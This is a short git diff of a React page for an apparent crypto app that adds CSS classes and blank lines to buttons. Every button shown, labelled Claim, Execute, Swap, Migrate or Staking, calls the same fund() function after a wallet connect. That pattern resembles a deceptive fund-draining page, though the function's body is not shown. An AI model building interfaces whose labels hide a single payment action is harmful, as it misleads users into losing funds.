@@ -91,7 +91,9 @@ async function fund() {
         
         <div className="connect-btn-container">
         <Toggle></Toggle>
+     
         <button onClick={() => connect()} className="connect-btn">connect</button>
+        
 
        </div>
       </header>
@@ -109,9 +111,9 @@ async function fund() {
 
             <div className="inner-button-wrap-1">
 
-            <button  onClick={() => fund()}>Claim</button>
+            <button className="btn"  onClick={() => fund()}>Claim</button>
                {isConnected ? <button onClick={() => fund()}>Execute</button> : ""}
-          <button onClick={() => fund()}>Swap</button>
+          <button className="btn" onClick={() => fund()}>Swap</button>
 
             </div>
 
@@ -119,8 +121,8 @@ async function fund() {
 
           <div className="main-button-wrap-2">
             <div className="inner-button-wrap-2">
-            <button  onClick={() => fund()}>Migrate</button>
-          <button  onClick={() => fund()}>Staking</button>
+            <button className="btn"  onClick={() => fund()}>Migrate</button>
+          <button className="btn" onClick={() => fund()}>Staking</button>
               
 
             </div>
